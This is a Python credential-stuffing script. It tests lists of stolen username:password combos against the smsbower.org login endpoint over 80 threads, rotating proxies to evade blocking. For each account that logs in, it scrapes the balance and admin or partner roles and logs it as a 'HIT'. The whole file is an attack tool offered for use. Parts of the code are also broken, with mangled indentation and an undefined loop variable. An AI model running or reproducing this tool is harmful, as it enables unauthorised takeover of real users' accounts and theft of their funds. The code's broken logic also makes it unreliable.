import requests
from bs4 import BeautifulSoup
import time
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# ================= CONFIG =================
WORDLIST_FILE = "combos.txt"
PROXY_FILE = "proxies.txt"          # Leave empty or delete file = no proxy
THREADS = 80                         # Adjust as you want (Fly.io free handles 80–100 easily)
CHECK_INTERVAL = 0                   # 0 = run once and exit, 3600 = repeat every hour
# ==========================================

success_count = 0
fail_count = 0
lock = threading.Lock()

def load_file_lines(filename):
    if not os.path.exists(filename):
     print(f"[!] {filename} not found!")
     return []
 with open(filename, 'r', encoding='utf-8') as f:
     return [line.strip() for line in f if line.strip()]

def save_result(data, filename="good.txt"):
 with lock:
     with open(filename, 'a', encoding='utf-8') as f:
         f.write(data + '\n')

def attempt_login(username, password, proxy=None):
 global success_count, fail_count

 login_url = "https://smsbower.org/login/process"
 home_url  = "https://smsbower.org/"

 headers = {
     'authority': 'smsbower.org',
     'accept': 'application/json, text/plain, */*',
     'content-type': 'application/json',
     'origin': 'https://smsbower.org',
     'referer': 'https://smsbower.org/',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
 }

 login_data = {"login": username, "password": password}

 proxies = None
 if proxy:
     if proxy.startswith(('http://', 'https://')):
         proxies = {'http': proxy, 'https': proxy}
     elif proxy.startswith('socks4://'):
         proxies = {'http': proxy, 'https': proxy}
     elif proxy.startswith('socks5://'):
         proxies = {'http': proxy, 'https': proxy}
     else:
         proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}

 try:
     session = requests.Session()
     response = session.post(login_url, headers=headers, json=login_data,
                             proxies=proxies, timeout=30)

     if response.status_code != 200:
         fail_count += 1
         return False

     try:
         result = response.json()
     except:
         save_result(f"{username}:{password}", "bad.txt")
         print(f"Failed: {username}:{password} → JSON Error")
         fail_count += 1
         return False

     if not result.get("status"):
         save_result(f"{username}:{password}", "bad.txt")
         print(f"Failed: {username}:{password} → {result.get('message','Login Failed')}")
         fail_count += 1
         return False

     # Login success → get balance
     home = session.get(home_url, headers=headers, proxies=proxies, timeout=30)
     soup = BeautifulSoup(home.text, 'html.parser')
     balance = soup.find('div', class_='user-balance')
     balance_text = balance.get_text(strip=True) if balance else "0"

     # Roles
     profile = soup.find('profile-action')
     roles = []
     if profile:
         if profile.get(':is-partner') == 'true':   roles.append("Partner")
         if profile.get(':is-admin') == 'true':     roles.append("Admin")
         if profile.get(':is-client') == 'true':    roles.append("Client")
         if roles:
         role_str = " | ".join(roles)
     else:
         role_str = "No Special Role"

     hit_line = f"HIT → {username}:{password} | Balance: {balance_text} | {role_str}"
     save_result(hit_line, "good.txt")
     print(f"SUCCESS: {hit_line}")
     success_count += 1

 except Exception as e:
     print(f"Error {username}:{password} → {str(e)[:60]}")
     save_result(f"{username}:{password}", "bad.txt")
     fail_count += 1

def run_checker():
 global success_count, fail_count
 success_count = fail_count = 0

 print("\nStarting SMSBower Checker @", time.strftime("%Y-%m-%d %H:%M:%S"))
 combos = load_file_lines(WORDLIST_FILE)
 proxies = load_file_lines(PROXY_FILE)

 if not combos:
     print("No combos loaded. Exiting.")
     return

 print(f"Loaded {len(combos)} combos | {len(proxies)} proxies | {THREADS} threads")

 # Clear old results
 for f in ["good.txt", "bad.txt"]:
     if os.path.exists(f): os.remove(f)

 with ThreadPoolExecutor(max_workers=THREADS) as executor:
     futures = []
     for combo in combos:
         if ':' in combo:
             u, p = combo.split(':', 1)
         elif '|' in combo:
             u, p = combo.split('|', 1)
         else:
             continue

         proxy = proxies[i % len(proxies)] if proxies else None
         futures.append(executor.submit(attempt_login, u.strip(), p.strip(), proxy))

     for future in as_completed(futures):
         future.result()

 print("\nFinished!")
 print(f"Success: {success_count} | Failed: {fail_count}")
 print("Good accounts → good.txt")
 if CHECK_INTERVAL > 0:
     print(f"Next run in {CHECK_INTERVAL//60} minutes...\n")

if __name__ == "__main__":
 if CHECK_INTERVAL > 0:
     while True:
         run_checker()
         time.sleep(CHECK_INTERVAL)
 else:
     run_checker()
